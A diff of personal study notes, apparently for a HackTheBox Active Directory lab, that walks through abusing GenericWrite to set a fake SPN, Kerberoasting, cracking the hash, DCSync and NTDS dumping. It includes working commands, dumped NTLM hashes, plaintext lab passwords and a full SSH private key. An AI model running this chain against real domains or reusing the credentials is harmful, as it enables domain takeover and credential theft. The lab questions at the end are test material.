@@ -7,3 +7,223 @@ Digging into the BloodHound data we see that we have GenericWrite over the ttimm
 Let's go back to the DEV01 machine where we had loaded PowerView. We can create a PSCredential object to be able to run commands as the mssqladm user without having to RDP again.
 
 this also assumes we still have the fuckin c:\DontNetNuke\Portals\0> shell open so yeah maybe just never ever fucking close anything ever. ever. 
+
+SYNTAX: 
+PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+
+Next we'll use Set-DomainObject to set a fake SPN on the target account. We'll create an SPN named acmetesting/LEGIT which we'll of course delete later and note in the appendices of our report.
+
+SYNTAX: 
+PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons
+
+okay before moving on lets kinda summarize how we got here. we learned from Bloodhound that ttimons has GenericWrite -> look in obsidan for windows permissions and what to look for / attack paths to take but for this we want to think kerberoasting or SPN 
+
+Step-by-Step Breakdown: From GenericWrite on ttimmons to Privilege Escalation
+Now that we have the GetUserSPNs.py output, let's break this process down into step-by-step actions that lead from GenericWrite on ttimmons to obtaining a Kerberoastable ticket and moving forward with privilege escalation.
+
+Step 1: Identify the GenericWrite Privilege on ttimmons
+* While analyzing BloodHound, we discovered that the current compromised user has GenericWrite over ttimmons.
+
+* GenericWrite allows us to modify attributes of ttimmons, which means we can set an SPN (Service Principal Name) on the account.
+
+Step 2: Set a Fake SPN on ttimmons
+* Since we have GenericWrite, we abuse it by setting a fake Service Principal Name (SPN) using PowerView.
+
+* This action makes ttimmons a Kerberoasting target because Kerberos tickets can now be requested for the fake SPN.
+
+Command to Set the Fake SPN (acmetesting/LEGIT) on ttimmons:
+PS SYNTAX: Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{servicePrincipalName="acmetesting/LEGIT"}
+
+* What this does: It assigns the SPN acmetesting/LEGIT to ttimmons, making it possible to request a Kerberos TGS (Ticket Granting Service) ticket.
+
+Step 3: Request a TGS Ticket for ttimmons
+Now that ttimmons has an SPN, we can request a Kerberos TGS ticket using GetUserSPNs.py.
+SYNTAX: proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+
+Breakdown of this command:
+
+proxychains → Routes the request through a pivot (if needed).
+
+GetUserSPNs.py → Requests Kerberos tickets for accounts with SPNs.
+
+-dc-ip 172.16.8.3 → Specifies the Domain Controller IP.
+
+INLANEFREIGHT.LOCAL/mssqladm → Uses mssqladm credentials to authenticate.
+
+-request-user ttimmons → Requests a Kerberos TGS ticket for ttimmons.
+
+Step 4: Extract and Crack the Kerberos Hash
+The output from GetUserSPNs.py provides a Kerberos TGS hash, which can be cracked using hashcat.
+
+Command to Crack the Hash:
+SYNTAX: hashcat -m 13100 ttimmons_hash /usr/share/wordlists/rockyou.txt
+
+Step 5: Authenticate as ttimmons and Move Further
+If hashcat cracks the password, we can now authenticate as ttimmons using:
+SYNTAX: proxychains evil-winrm -i 172.16.8.3 -u ttimmons -p <CrackedPassword>
+
+If ttimmons has high privileges, we can attempt privilege escalation to gain access to Domain Admin or SYSTEM.
+
+How Does mssqladm Tie Into This?
+The mssqladm credential object was created earlier because it allowed us to continue using PowerView for enumeration without needing to RDP into the system again.
+
+mssqladm was NOT directly involved in setting the SPN, but we used it for authentication while requesting the TGS ticket for ttimmons.
+
+TL;DR - Full Attack Chain
+1. BloodHound shows we have GenericWrite over ttimmons.
+
+2. We abuse GenericWrite to set a fake SPN on ttimmons (acmetesting/LEGIT).
+
+3. We request a Kerberos TGS ticket for ttimmons using GetUserSPNs.py.
+
+4. We extract and crack the Kerberos hash using hashcat (-m 13100).
+
+5. If successful, we log in as ttimmons using Evil-WinRM and escalate further.
+
+
+Moving onward.. 
+
+After cracking the password we go back to bloodhound to see what other access the user has since we now have the password -> 
+we see that we have GenericAll over the SERVER ADMINS group.
+
+Looking a bit further we see that the SERVER ADMINS group has the ability to perform the DCSync attack to obtain NTLM password hashes for any users in the domain..
+
+We use abuse this by first adding the ttimmons user to the group. First we'll need to create another PSCredential object.
+
+PS SYNTAX: 
+PS C:\htb> PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
+PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+
+Once this is done, we can add the user to the target group and inherit the DCSync privileges.
+
+PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
+PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622
+Finally, we can use Secretsdump to DCSync all NTLM password hashes from the Domain Controller.
+
+ON SUDO SU SHELL -> 
+SYNTAX: MJBUCKNER@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
+
+Password:
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:49676-<><>-OK
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e55xxxxxxxxxx787ddbb6e6afa2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
+inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
+inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
+inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
+inlanefreight.local\wdillard:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
+
+
+4. Privilege Escalation: ttimmons has GenericAll over SERVER ADMINS
+BloodHound reveals that ttimmons has GenericAll over the SERVER ADMINS group.
+
+What does GenericAll allow?
+
+Full control over the object, meaning we can add ourselves to the SERVER ADMINS group.
+
+Command to add ttimmons to SERVER ADMINS:
+
+Why is this significant?
+
+The SERVER ADMINS group has the DCSync privilege, meaning we can dump NTLM hashes for any user.
+
+We obtain NTLM password hashes for Domain Admins, effectively fully compromising Active Directory.
+
+6. Next Steps: Domain Dominance
+Once we control a Domain Admin account:
+
+Dump the NTDS.dit database:
+ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
+
+RDP into the Domain Controller for verification:
+proxychains xfreerdp /v:DC01 /u:DOMAIN\admin /p:P@ssw0rd! /d:INLANEFREIGHT.LOCAL
+
+Check domain trust relationships for additional movement:
+Get-NetDomainTrust
+
+This scenario is a realistic AD attack chain, demonstrating how a single misconfigured permission (GenericWrite → GenericAll) can escalate into complete domain takeover.
+
+okay so now lets try to run through these questions... again a big fix for next time is to actually use sharphound and bloodhound lol 
+
+
+hporter:Gr8hambino!
+
+
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
+-----END OPENSSH PRIVATE KEY-----
+
+
+
+
+
+Question 1 - Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer. 
+
+
+Question 2 - After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop.
+
+
+Question 3 - Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer.
+
+
+
+
+
+
+
+
